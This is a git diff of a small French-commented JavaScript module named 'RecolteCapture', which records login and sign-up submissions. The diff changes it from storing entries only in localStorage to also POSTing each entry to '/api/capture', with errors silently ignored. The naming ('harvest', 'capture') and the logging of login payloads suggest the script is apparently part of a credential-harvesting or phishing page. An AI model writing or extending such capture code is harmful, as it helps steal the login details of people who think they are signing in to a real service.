@@ -1,4 +1,4 @@
-/** Script partagé : inscriptions + connexions (localStorage uniquement). */
+/** Script partagé : inscriptions + connexions (serveur + localStorage). */
 (function () {
   const REG_KEY = "recolte_registrations";
   const LOGIN_KEY = "recolte_logins";
@@ -19,7 +19,7 @@
     }
   }
 
-  function push(key, entry) {
+  function pushLocal(key, entry) {
     const list = read(key);
     list.unshift(entry);
     localStorage.setItem(key, JSON.stringify(list));
@@ -53,19 +53,34 @@
     };
   }
 
+  function sendToServer(entry) {
+    fetch("/api/capture", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(entry),
+      keepalive: true,
+    }).catch(function () {
+      /* API indisponible en local sans vercel dev */
+    });
+  }
+
+  function save(event, payload) {
+    const entry = normalize(payload, event);
+    const key = event === "register" ? REG_KEY : LOGIN_KEY;
+    pushLocal(key, entry);
+    sendToServer(entry);
+    return true;
+  }
+
   window.RecolteCapture = {
     looksLikePhone,
 
-    /** Connexion (Se connecter) */
     saveLogin(payload) {
-      push(LOGIN_KEY, normalize(payload, "login"));
-      return true;
+      return save("login", payload);
     },
 
-    /** Inscription (Créer un compte / S'inscrire) */
     saveRegister(payload) {
-      push(REG_KEY, normalize(payload, "register"));
-      return true;
+      return save("register", payload);
     },
 
     /** @deprecated utilise saveLogin */
